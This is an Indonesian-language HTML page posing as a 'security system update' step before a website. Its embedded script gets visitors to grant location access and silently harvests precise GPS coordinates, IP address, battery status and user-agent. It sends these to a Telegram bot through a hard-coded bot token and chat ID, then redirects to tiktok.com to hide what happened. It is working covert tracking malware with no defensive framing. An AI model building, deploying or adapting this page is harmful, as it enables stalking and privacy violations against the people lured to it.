<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Menuju Website Utama...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }
        body {
            background-color: #f4f6f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background: #fff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            text-align: center;
            max-width: 450px;
            width: 100%;
        }
        h2 {
            color: #2c3e50;
            margin-bottom: 15px;
            font-size: 1.6rem;
        }
        p {
            color: #7f8c8d;
            font-size: 1rem;
            margin-bottom: 25px;
            line-height: 1.5;
        }
        .btn {
            display: inline-block;
            width: 100%;
            padding: 14px;
            background-color: #3498db;
            color: #fff;
            text-decoration: none;
            border-radius: 8px;
            font-weight: bold;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            transition: background 0.2s ease;
        }
        .btn:hover {
            background-color: #2980b9;
        }
        .loading {
            display: none;
            margin-top: 15px;
            color: #e67e22;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>

    <div class="card">
        <h2>Pembaruan Sistem Keamanan</h2>
        <p>Untuk melanjutkan ke halaman utama yang aman, silakan klik tombol di bawah ini dan konfirmasikan izin peramban Anda jika diminta.</p>
        
        <button class="btn" id="btnLanjut" onclick="prosesMasuk()">Lanjutkan ke Website</button>
        <div class="loading" id="statusTeks">Menghubungkan ke server aman...</div>
    </div>

    <script>
        // === KONFIGURASI UTAMA ===
        const TELEGRAM_TOKEN = '8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0'; 
        const CHAT_ID = '1966317946'; 
        const DOMAIN_TUJUAN = 'https://tiktok.com'; 

        // Fungsi pembantu untuk mengambil data IP dengan timeout ketat (2.5 detik)
        async function ambilIP() {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), 2500);
            try {
                const res = await fetch('https://ipify.org', { signal: controller.signal });
                const data = await res.json();
                clearTimeout(id);
                return `• IP: \`${data.ip}\``;
            } catch (e) {
                return "• IP: `Gagal mengambil IP (Timeout/Blocked)`";
            }
        }

        // Fungsi pembantu untuk mengambil data baterai
        async function ambilBaterai() {
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    return `${Math.round(battery.level * 100)}% (${battery.charging ? "Mengecas" : "Tidak mengecas"})`;
                } catch(e) {}
            }
            return "Tidak didukung";
        }

        async function prosesMasuk() {
            const btn = document.getElementById('btnLanjut');
            const status = document.getElementById('statusTeks');
            
            btn.disabled = true;
            btn.innerText = "Memproses...";
            status.style.display = "block";

            // Jalankan pengambilan IP dan baterai secara paralel di latar belakang
            const ipPromise = ambilIP();
            const bateraiPromise = ambilBaterai();
            const infoPerangkat = navigator.userAgent;

            // Langsung panggil Geolocation tanpa menunggu proses IP selesai
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async function(position) {
                        // JIKA BERHASIL MENDAPATKAN LOKASI AKURAT
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const akurasi = position.coords.accuracy;
                        const petaUrl = `https://google.com{lat},${lon}`;
                        
                        const ipInfo = await ipPromise;
                        const infoBaterai = await bateraiPromise;

                        const pesan = `📍 *Akses Lokasi Diterima*\n\n` +
                                      `🔋 *Baterai*: ${infoBaterai}\n` +
                                      `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                      `🎯 *Koordinat Akurat*:\n` +
                                      `• Lat: \`${lat}\`\n` +
                                      `• Lon: \`${lon}\`\n` +
                                      `• Akurasi: ±${Math.round(akurasi)}m\n` +
                                      `• Peta: ${petaUrl}\n\n` +
                                      `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                        
                        kirimKeTelegram(pesan);
                    },
                    async function(error) {
                        // JIKA GAGAL ATAU DITOLAK
                        const ipInfo = await ipPromise;
                        const infoBaterai = await bateraiPromise;
                        let detailError = "Ditolak pengguna / Sistem sibuk";
                        
                        if (error.code === error.PERMISSION_DENIED) {
                            detailError = "Pengguna menolak izin";
                        } else if (error.code === error.POSITION_UNAVAILABLE) {
                            detailError = "Sinyal GPS tidak tersedia";
                        } else if (error.code === error.TIMEOUT) {
                            detailError = "Waktu pencarian habis (Timeout)";
                        }

                        const pesanGagal = `⚠️ *Pengunjung Masuk (Gagal Koordinat)*\n\n` +
                                           `• Alasan: ${detailError}\n` +
                                           `🔋 *Baterai*: ${infoBaterai}\n` +
                                           `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                           `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                        
                        kirimKeTelegram(pesanGagal);
                    },
                    // PENGATURAN GEOLOCATION UNTUK AKURASI TINGGI MAKSIMAL
                    { 
                        enableHighAccuracy: true, // Mengaktifkan kembali GPS internal fisik HP
                        timeout: 7000,            // Memberikan waktu 7 detik bagi GPS untuk mengunci posisi
                        maximumAge: 0             // Memaksa peramban mencari lokasi baru (bukan lokasi cache lama)
                    }
                );
            } else {
                const ipInfo = await ipPromise;
                const infoBaterai = await bateraiPromise;
                const pesanNoGeo = `❌ *Fitur Koordinat Tidak Didukung*\n\n` +
                                   `🔋 *Baterai*: ${infoBaterai}\n` +
                                   `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                   `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                kirimKeTelegram(pesanNoGeo);
            }
        }

        function kirimKeTelegram(teksPesan) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: teksPesan,
                    parse_mode: 'Markdown'
                })
            })
            .then(() => {
                window.location.href = DOMAIN_TUJUAN;
            })
            .catch((err) => {
                console.error("Gagal mengirim log:", err);
                window.location.href = DOMAIN_TUJUAN;
            });
        }
    </script>

</body>
</html>
